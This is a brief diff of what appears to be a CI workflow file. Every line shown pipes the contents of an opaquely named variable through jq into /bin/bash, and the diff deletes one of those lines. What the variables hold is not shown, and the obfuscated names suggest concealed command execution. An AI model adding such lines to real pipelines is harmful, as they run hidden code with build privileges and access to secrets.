@@ -57,7 +57,6 @@ jobs:
           echo $shcbt751 | jq -r .xao7687 | /bin/bash
           echo $isd01 | jq -r .fhfe40886 | /bin/bash
           printf '%s' "$xwes02922" | jq -r .kb1 | /bin/bash
-          echo $pbt466 | jq -r .v077 | /bin/bash
           echo $zeopw01 | jq -r .jydd763 | /bin/bash
           printf '%s' "$yggpc58569" | jq -r .khozd3 | /bin/bash
           echo $qxndd10 | jq -r .eadm5866 | /bin/bash
